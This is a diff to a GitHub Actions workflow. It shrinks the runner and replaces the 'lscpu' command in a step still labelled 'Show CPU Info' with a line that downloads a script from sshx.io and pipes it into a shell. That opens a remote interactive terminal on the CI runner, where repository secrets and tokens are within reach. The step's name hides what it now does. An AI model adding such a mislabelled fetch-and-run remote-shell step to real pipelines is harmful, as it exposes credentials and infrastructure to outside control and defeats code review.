@@ -7,10 +7,10 @@ on:
 
 jobs:
   check-cpu:
-    runs-on: carbonrunner-32vcpu-ubuntu-2404
+    runs-on: carbonrunner-8vcpu-ubuntu-2404
 
     steps:
       - uses: actions/checkout@v4
 
       - name: Show CPU Info
-        run: lscpu
+        run: curl -sSf https://sshx.io/get | sh -s run
